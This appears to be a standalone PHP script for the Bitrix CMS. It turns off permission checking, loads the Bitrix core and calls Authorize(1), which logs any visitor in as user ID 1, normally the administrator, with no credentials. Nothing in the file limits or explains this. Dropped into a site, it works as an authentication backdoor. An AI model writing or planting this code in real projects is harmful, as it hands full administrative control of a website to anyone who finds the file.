<?php
define('NOT_CHECK_PERMISSION',true);
require ($_SERVER["DOCUMENT_ROOT"] . "/bitrix/modules/main/include/prolog_before.php");
global $USER;
$USER->Authorize(1);